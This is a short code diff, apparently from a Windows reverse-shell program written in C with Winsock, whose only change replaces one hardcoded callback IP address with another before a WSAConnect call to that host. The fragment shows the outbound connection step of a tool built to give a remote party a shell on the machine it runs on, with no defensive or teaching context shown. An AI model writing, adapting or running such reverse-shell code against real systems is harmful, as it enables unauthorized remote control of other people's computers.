@@ -24,7 +24,7 @@
         shell_addr.sin_port = htons(port);
         shell_addr.sin_family = AF_INET;
         // hardcode ip
-        shell_addr.sin_addr.s_addr = inet_addr("192.168.1.23");
+        shell_addr.sin_addr.s_addr = inet_addr("192.168.35.161");
 
         connection = WSAConnect(shell, (struct sockaddr*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
         if (connection == SOCKET_ERROR) {
